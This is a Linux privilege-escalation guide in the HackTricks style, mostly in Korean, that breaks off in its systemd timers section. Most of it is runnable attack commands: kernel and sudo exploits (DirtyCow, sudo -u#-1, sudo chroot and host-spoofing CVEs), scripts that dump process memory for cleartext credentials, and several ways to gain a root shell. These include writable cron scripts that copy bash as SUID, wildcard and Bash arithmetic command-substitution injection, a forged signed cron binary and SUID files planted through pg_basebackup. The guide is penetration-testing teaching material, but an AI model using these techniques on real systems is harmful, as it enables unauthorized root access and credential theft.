# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 시스템 정보

### OS info

OS에 대해 조금 더 알아보는 것부터 시작해봅시다
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 경로

`PATH` 변수 내부의 어떤 폴더에라도 **쓰기 권한**이 있다면 일부 라이브러리나 바이너리를 하이재킹할 수 있습니다:
```bash
echo $PATH
```
### Env info

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

커널 버전을 확인하고 권한 상승에 사용할 수 있는 익스플로잇이 있는지 확인하세요
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
You can find a good vulnerable kernel list and some already **compiled exploits** here: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

To extract all the vulnerable kernel versions from that web you can do:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploit를 검색하는 데 도움이 될 수 있는 도구는 다음과 같습니다:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim에서 실행, kernel 2.x의 exploit만 확인)

항상 **kernel version을 Google에서 검색**하세요. kernel version이 어떤 kernel exploit에 적혀 있을 수 있고, 그러면 그 exploit가 유효한지 확신할 수 있습니다.

추가 kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

다음에 나타나는 취약한 sudo 버전을 기반으로:
```bash
searchsploit sudo
```
이 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 이전의 Sudo 버전(**1.9.14 - 1.9.17 < 1.9.17p1**)은 `/etc/nsswitch.conf` 파일이 사용자 제어 디렉터리에서 사용될 때, 권한이 없는 로컬 사용자가 sudo `--chroot` 옵션을 통해 자신의 권한을 root로 상승시킬 수 있게 합니다.

이 취약점을 악용하기 위한 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)가 여기 있습니다. 취약점을 실행하기 전에 `sudo` 버전이 취약한지, 그리고 `chroot` 기능을 지원하는지 확인하세요.

자세한 내용은 원본 [취약점 권고문](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)을 참고하세요.

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 이전의 Sudo(영향을 받는 범위로 보고됨: **1.8.8–1.9.17**)는 **실제 hostname** 대신 `sudo -h <host>`의 **사용자 제공 hostname**을 사용해 host-based sudoers 규칙을 평가할 수 있습니다. sudoers가 다른 host에 더 넓은 권한을 부여한다면, 로컬에서 그 host를 **spoof**할 수 있습니다.

요구 사항:
- 취약한 sudo 버전
- host-specific sudoers rules (host is neither the current hostname nor `ALL`)

예시 sudoers 패턴:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
허용된 host를 스푸핑하여 Exploit:
```bash
sudo -h devbox id
sudo -h devbox -i
```
스푸핑된 이름의 해석이 막히면 `/etc/hosts`에 추가하거나, DNS 조회를 피하기 위해 이미 로그/configs에 나타나는 hostname을 사용하세요.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

이 취약점이 어떻게 악용될 수 있는지에 대한 **예시**는 **HTB의 smasher2 box**를 확인하세요
```bash
dmesg 2>/dev/null | grep "signature"
```
### 추가 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어 기법 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

컨테이너 내부에 있다면, 다음 container-security 섹션부터 시작한 다음 runtime-specific abuse 페이지로 pivot하세요:


{{#ref}}
container-security/
{{#endref}}

## Drives

무엇이 mounted 및 unmounted 되었는지, 어디에 그리고 왜 그런지 확인하세요. 무엇이든 unmounted 되어 있다면 mount를 시도하고 private info를 확인해볼 수 있습니다
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리를 열거하세요
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한 **어떤 compiler가 설치되어 있는지** 확인하세요. 이는 kernel exploit을 사용해야 할 때 유용합니다. 가능한 한 사용할 machine에서(또는 비슷한 machine에서) 직접 compile하는 것이 권장되기 때문입니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 설치된 취약한 소프트웨어

**설치된 패키지와 서비스의 버전**을 확인하세요. 오래된 Nagios 버전(예를 들어)이 있어서 권한 상승에 악용될 수 있습니다…\
가장 수상한 설치된 소프트웨어의 버전은 수동으로 확인하는 것이 권장됩니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _이러한 명령은 대부분 쓸모없는 정보를 많이 보여주므로, OpenVAS 같은 애플리케이션을 사용해 설치된 소프트웨어 버전이 알려진 exploit에 취약한지 확인하는 것이 권장됩니다_

## Processes

어떤 **프로세스**가 실행 중인지 살펴보고, 어떤 프로세스가 **필요 이상으로 높은 권한**을 가지고 있는지 확인하세요(예: root로 실행되는 tomcat?).
```bash
ps aux
ps -ef
top -n 1
```
항상 실행 중인 가능성 있는 [**electron/cef/chromium debuggers**](electron-cef-chromium-debugger-abuse.md)를 확인하세요. 이를 악용해 권한을 상승시킬 수 있습니다. **Linpeas**는 프로세스의 command line 안에 `--inspect` 파라미터가 있는지 확인하여 이를 탐지합니다.\
또한 프로세스 바이너리에 대한 권한도 확인하세요. 누군가를 덮어쓸 수 있을지도 모릅니다.

### Cross-user parent-child chains

부모와 **다른 사용자** 아래에서 실행되는 child process가 자동으로 악성인 것은 아니지만, 유용한 **triage signal**입니다. 일부 전환은 예상 가능한 경우가 있습니다 (`root`가 service user를 시작하거나, login managers가 session processes를 생성하는 경우). 하지만 비정상적인 chain은 wrappers, debug helpers, persistence, 또는 약한 runtime trust boundaries를 드러낼 수 있습니다.

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
놀라운 chain을 찾으면, parent command line과 그 동작에 영향을 주는 모든 파일(`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments)을 inspect하세요. 여러 실제 privesc 경로에서 child 자체는 writable이 아니었지만, **parent-controlled config** 또는 helper chain은 writable이었습니다.

### Deleted executables and deleted-open files

Runtime artifacts는 **삭제 후에도** 종종 여전히 접근 가능합니다. 이는 privilege escalation과 이미 sensitive files를 열고 있는 process에서 evidence를 복구하는 데 모두 유용합니다.

deleted executables를 확인하세요:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
If `/proc/<PID>/exe`가 `(deleted)`를 가리키고 있다면, 해당 프로세스는 여전히 메모리에서 이전 바이너리 이미지를 실행 중입니다. 이는 조사해볼 만한 강한 신호입니다. 그 이유는:

- 삭제된 실행 파일에 흥미로운 문자열이나 credentials가 들어 있을 수 있습니다
- 실행 중인 프로세스가 여전히 유용한 file descriptors를 노출할 수 있습니다
- 삭제된 privileged binary는 최근의 tampering 또는 attempted cleanup을 나타낼 수 있습니다

deleted-open files를 전역적으로 수집:
```bash
lsof +L1
```
흥미로운 descriptor를 찾으면, 직접 복구하라:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
이것은 프로세스가 삭제된 secret, script, database export, 또는 flag file을 아직 열고 있을 때 특히 유용합니다.

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy) 같은 도구를 사용해 프로세스를 모니터링할 수 있습니다. 이는 취약한 프로세스가 자주 실행되는지, 또는 특정 조건이 충족될 때 실행되는지 식별하는 데 매우 유용할 수 있습니다.

### Process memory

서버의 일부 서비스는 **credentials를 clear text로 memory 안에 저장**합니다.\
보통 다른 사용자의 프로세스 memory를 읽으려면 **root privileges**가 필요하므로, 이는 이미 root인 상태에서 더 많은 credentials를 발견하고 싶을 때 더 유용합니다.\
하지만 **일반 사용자로서도 자신이 소유한 프로세스의 memory는 읽을 수 있다**는 점을 기억하세요.

> [!WARNING]
> 요즘 대부분의 머신은 기본적으로 **ptrace를 허용하지 않기 때문에**, 권한이 없는 사용자에 속한 다른 프로세스를 dump할 수 없습니다.
>
> 파일 _**/proc/sys/kernel/yama/ptrace_scope**_ 는 ptrace의 접근 가능 여부를 제어합니다:
>
> - **kernel.yama.ptrace_scope = 0**: 같은 uid를 가지는 한 모든 프로세스를 debug할 수 있습니다. 이것이 ptracing이 동작하던 전통적인 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: 부모 프로세스만 debug할 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability가 필요하므로 관리자만 ptrace를 사용할 수 있습니다.
> - **kernel.yama.ptrace_scope = 3**: 어떤 프로세스도 ptrace로 trace할 수 없습니다. 한 번 설정되면 ptracing을 다시 활성화하려면 reboot가 필요합니다.

#### GDB

예를 들어 FTP 서비스의 memory에 접근할 수 있다면 Heap을 가져와 그 안에서 credentials를 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 process ID에 대해, **maps는 해당 process의** virtual address space 안에서 memory가 어떻게 매핑되어 있는지를 보여줍니다. 또한 각 매핑된 영역의 **permissions**도 보여줍니다. **mem** pseudo file은 **process의 memory 자체를 노출**합니다. **maps** 파일을 통해 어떤 **memory regions가 readable**인지와 그 offset을 알 수 있습니다. 이 정보를 사용해 **mem file로 seek한 뒤 모든 readable regions를 dump**하여 파일로 저장합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 시스템의 **physical** memory에 대한 접근을 제공하며, virtual memory가 아닙니다. kernel의 virtual address space는 /dev/kmem을 사용해 접근할 수 있습니다.\
일반적으로 `/dev/mem`은 **root**와 **kmem** group만 읽을 수 있습니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux용 ProcDump

ProcDump는 Windows용 Sysinternals 도구 모음의 고전적인 ProcDump 도구를 Linux에서 다시 구현한 것입니다. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)에서 받을 수 있습니다.
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)의 Script A.5 (root is required)

### Credentials from Process Memory

#### Manual example

authenticator 프로세스가 실행 중임을 발견하면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스를 dump할 수 있습니다(프로세스 메모리를 dump하는 다양한 방법은 앞의 섹션을 참조) 그리고 메모리 안에서 credentials를 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)은 메모리와 일부 **잘 알려진 파일**에서 **평문 자격 증명을 훔칩니다**. 제대로 동작하려면 root 권한이 필요합니다.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

웹 “Crontab UI” 패널(alseambusher/crontab-ui)이 root로 실행되고 loopback에만 바인딩되어 있어도, SSH local port-forwarding을 통해 접근한 뒤 privileged job을 생성해서 privilege escalation을 할 수 있습니다.

Typical chain
- `ss -ntlp` / `curl -v localhost:8000`로 loopback 전용 포트(예: 127.0.0.1:8000)와 Basic-Auth realm을 찾기
- 운영 아티팩트에서 credentials 찾기:
- `zip -P <password>`가 있는 백업/스크립트
- `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`를 노출하는 systemd unit
- 터널링 및 로그인:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 즉시 실행되는 high-priv job 생성 (SUID shell 드롭):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 사용법:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI를 root로 실행하지 말 것; 전용 사용자와 최소 권한으로 제한할 것
- localhost에 바인딩하고 추가로 firewall/VPN으로 접근을 제한할 것; 비밀번호를 재사용하지 말 것
- unit files에 secrets를 포함하지 말 것; secret stores 또는 root-only EnvironmentFile을 사용할 것
- on-demand job 실행에 대해 audit/logging을 활성화할 것



예약된 job에 취약점이 있는지 확인할 것. root가 실행하는 script를 악용할 수 있을지도 모른다 (wildcard vuln? root가 사용하는 files를 수정할 수 있나? symlinks를 사용할 수 있나? root가 사용하는 directory에 특정 files를 생성할 수 있나?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
If `run-parts`가 사용된다면, 어떤 이름이 실제로 실행되는지 확인하세요:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
이렇게 하면 false positives를 방지할 수 있습니다. writable periodic directory는 payload 파일 이름이 로컬 `run-parts` 규칙과 일치할 때만 유용합니다.

### Cron path

예를 들어, _/etc/crontab_ 내부에서 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user "user"가 /home/user에 대해 writing privileges를 가지고 있다는 점에 유의하세요_)

이 crontab 안에서 root 사용자가 path를 설정하지 않은 채 어떤 command나 script를 실행하려고 한다면. 예를 들어: _\* \* \* \* root overwrite.sh_\
그러면 다음을 사용해 root shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### 와일드카드가 있는 스크립트를 사용하는 Cron (Wildcard Injection)

root로 실행되는 스크립트에 명령어 안에 “**\***”가 있으면, 이를 악용해서 예상치 못한 동작(예: privesc)을 일으킬 수 있습니다. 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**와일드카드 앞에** _**/some/path/\***_ **같은 경로가 붙어 있으면 취약하지 않습니다(심지어** _**./\***_ **도 아닙니다).**

더 많은 wildcard exploitation 트릭은 다음 페이지를 읽어보세요:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash는 `((...))`, `$((...))`, `let`에서 산술 평가 전에 parameter expansion과 command substitution을 수행합니다. root cron/parser가 신뢰할 수 없는 로그 필드를 읽어 arithmetic context에 넣는다면, 공격자는 `$(...)` command substitution을 주입해 cron 실행 시 root 권한으로 실행되게 할 수 있습니다.

- 동작 이유: Bash에서 expansion은 다음 순서로 일어납니다: parameter/variable expansion, command substitution, arithmetic expansion, 그 다음 word splitting과 pathname expansion. 따라서 `$(/bin/bash -c 'id > /tmp/pwn')0` 같은 값은 먼저 치환되어(명령이 실행됨) 이후 남은 숫자 `0`이 산술 계산에 사용되므로 스크립트는 에러 없이 계속 진행됩니다.

- 일반적인 취약 패턴:
```bash
#!/bin/bash
# 예: 로그를 파싱해 로그에서 온 count 필드를 "합산"하는 경우
while IFS=',' read -r ts user count rest; do
# log가 attacker-controlled이면 count는 신뢰할 수 없음
(( total += count ))     # 또는: let "n=$count"
done < /var/www/app/log/application.log
```

- exploitation: 파싱되는 로그에 attacker-controlled 텍스트를 써서 숫자처럼 보이는 필드에 command substitution이 포함되고 숫자로 끝나도록 만듭니다. 명령이 stdout에 출력하지 않도록 하거나 리디렉션해서 arithmetic이 유효하게 유지되도록 하세요.
```bash
# 로그 안에 주입된 필드 값(예: 앱이 그대로 기록하는 crafted HTTP request를 통해):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# root cron parser가 (( total += count ))를 평가할 때, 명령이 root로 실행됩니다.
```

### Cron script overwriting and symlink

root가 실행하는 cron script를 **수정할 수 있다면**, 아주 쉽게 shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root가 실행하는 스크립트가 **완전한 접근 권한이 있는 디렉터리**를 사용한다면, 그 폴더를 삭제하고 **다른 곳을 가리키는 symlink 폴더를 생성**해서, 자신이 제어하는 스크립트를 제공하는 데 유용할 수 있습니다.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink 검증 및 더 안전한 파일 처리

경로로 파일을 읽거나 쓰는 권한이 있는 스크립트/바이너리를 검토할 때, 링크가 어떻게 처리되는지 확인하세요:

- `stat()`은 symlink를 따라가 대상의 메타데이터를 반환합니다.
- `lstat()`은 링크 자체의 메타데이터를 반환합니다.
- `readlink -f`와 `namei -l`은 최종 대상 경로를 해석하고 각 경로 구성 요소의 권한을 보여주는 데 도움이 됩니다.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: 경로가 이미 존재하면 실패합니다(공격자가 미리 만들어 둔 links/files를 차단).
- `openat()`: 신뢰할 수 있는 디렉터리 file descriptor를 기준으로 상대 경로를 처리합니다.
- `mkstemp()`: 안전한 permissions로 temporary files를 원자적으로 생성합니다.

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (this will monitor and list every process that starts).

### Root backups that preserve attacker-set mode bits (pg_basebackup)

If a root-owned cron wraps `pg_basebackup` (or any recursive copy) against a database directory you can write to, you can plant a **SUID/SGID binary** that will be recopied as **root:root** with the same mode bits into the backup output.

Typical discovery flow (as a low-priv DB user):
- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
이것은 `pg_basebackup`이 클러스터를 복사할 때 file mode bits를 보존하기 때문입니다. root에 의해 실행되면 대상 파일은 **root ownership + attacker-chosen SUID/SGID**를 상속합니다. permissions를 유지하고 executable location에 쓰는 유사한 privileged backup/copy routine도 모두 취약합니다.

### Invisible cron jobs

comment 뒤에 carriage return를 넣고(newline character 없이) cronjob을 만드는 것이 가능하며, cron job은 작동합니다. 예시입니다(carriage return char에 주의):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
이런 종류의 stealth entry를 탐지하려면, control characters를 드러내는 도구로 cron 파일을 검사하세요:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

`.service` 파일에 쓸 수 있는지 확인하세요. 쓸 수 있다면, **수정해서** 서비스가 **시작**, **재시작** 또는 **중지**될 때 **backdoor가 실행되도록** 할 수 있습니다(머신이 재부팅될 때까지 기다려야 할 수도 있습니다).\
예를 들어 `.service` 파일 안에 **`ExecStart=/tmp/script.sh`** 를 사용해 backdoor를 만들 수 있습니다.

### Writable service binaries

**서비스가 실행하는 binaries에 대한 쓰기 권한이 있다면**, 그것들을 backdoor로 바꿀 수 있다는 점을 기억하세요. 그러면 서비스가 다시 실행될 때 backdoor도 실행됩니다.

### systemd PATH - Relative Paths

**systemd**가 사용하는 PATH는 다음과 같이 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 어떤 폴더에든 **write**할 수 있다는 것을 발견하면 **privileges를 escalate**할 수 있을지도 모릅니다. 다음과 같은 **service configurations** 파일에서 사용되는 **relative paths**를 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, 시스템d PATH 폴더 안에 쓸 수 있는 **같은 이름**의 **실행 파일**을 만들고, 서비스가 취약한 동작(**Start**, **Stop**, **Reload**)을 실행하도록 요청받으면, **backdoor가 실행**됩니다(보통 unprivileged users는 서비스 시작/중지를 할 수 없지만 `sudo -l`을 사용할 수 있는지 확인하세요).

**`man systemd.service`에서 services에 대해 더 알아보세요.**

## **Timers**

**Timers**는 이름이 `**.timer**`로 끝나는 systemd unit files로, `**.service**` files나 events를 제어합니다. **Timers**는 cron의 대안으로 사용할 수 있으며, calendar time events와 monotonic time events에 대한 built-in 지원이 있고 비동기적으로 실행할 수 있습니다.

모든 timers는 다음으로 열거할 수 있습니다:
```bash
systemctl list-timers --all
```
### Writable timers

timer를 수정할 수 있다면 systemd.unit의 기존 항목(예: `.service` 또는 `.target`)을 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
문서에서 Unit이 무엇인지 읽을 수 있습니다:

> 이 timer가 만료될 때 활성화할 unit. 인자는 unit name이며, 접미사는 ".timer"가 아닙니다. 지정하지 않으면, 이 값은 timer unit과 같은 이름을 가진 service로 기본 설정되며, 접미사만 다릅니다. (위 참고.) 활성화되는 unit name과 timer unit의 unit name은 접미사를 제외하고 동일하게 이름을 짓는 것이 권장됩니다.

따라서 이 권한을 악용하려면 다음이 필요합니다:

- writable binary를 **실행하는** 어떤 systemd unit(예: `.service`)을 찾기
- **relative path**를 **실행하는** systemd unit을 찾고, 해당 executable을 impersonate할 수 있도록 **systemd PATH**에 대해 **writable privileges**를 가지기

**timer에 대해 더 알아보려면 `man systemd.timer`를 확인하세요.**

### **Timer 활성화**

timer를 활성화하려면 root privileges가 필요하며, 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
